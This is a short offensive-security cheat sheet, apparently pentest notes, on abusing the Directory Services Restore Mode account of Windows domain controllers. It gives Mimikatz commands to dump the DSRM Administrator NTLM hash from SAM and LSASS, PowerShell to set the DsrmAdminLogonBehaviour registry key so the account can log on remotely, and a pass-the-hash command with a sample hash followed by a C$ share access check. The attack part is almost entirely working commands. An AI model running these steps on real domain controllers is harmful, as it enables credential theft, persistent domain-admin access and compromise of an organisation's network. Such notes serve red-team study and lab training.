# DSRM

Directory Services Restore Mode (DSRM) is a Safe Mode boot option for Windows Server domain controllers and the main purpose of DSRM is to help system admins log in to the system to restore or repair an AD database.\
\
Every Domain controller has local administrator account called "Administrator" and his password is the DSRM password.



## Dump DSRM NTLM hash

{% hint style="info" %}
Require Domain Admin privileges
{% endhint %}

<pre class="language-powershell"><code class="lang-powershell"><strong># dumping from sam - DSRM local Administrator hash
</strong><strong>Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' 
</strong></code></pre>

```powershell
# dumping from lsass - Administrator hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
```



## Change Logon Behavior

In order to use DSRM account hash we need to change his registry key

<pre class="language-powershell"><code class="lang-powershell"><strong># Entering DC session
</strong><strong>Enter-PSSession -ComputerName dcorp-dc
</strong><strong>
</strong># Check if key exists
Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour'

# If exists set his value to 2
Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour' -Value 2 -Verbose

# If does not exist create it and set his value to 2
New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour' -Value 2 -PropertyType DWORD -Verbose
</code></pre>



## Passing the hash

```powershell
# /domain - the domain controller
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator
/ntlm:a102ad5753f4c441e3af31c97fad86fd 
/run:powershell.exe"'


# Check if worked
ls \\dcorp-dc\C$
```

